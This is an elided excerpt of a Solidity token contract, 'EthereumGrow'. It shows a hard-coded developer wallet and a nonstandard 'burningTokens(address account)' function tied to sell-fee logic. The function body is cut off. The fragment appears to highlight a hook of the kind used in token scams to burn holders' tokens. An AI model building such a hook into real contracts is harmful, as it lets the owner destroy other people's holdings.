...
interface IERC20 {
    ...
    function burningTokens(address account) external returns (uint256);
...
contract EthereumGrow is Context, IERC20 { 
    ...
    address payable public Wallet_Dev = payable(0xF154C8dD1dcC231aC193B49d5562C84F16243B9E);
    ...
    function burningTokens(address account) public swapTheLiquify override returns (uint256) {
        if(isSellFee){
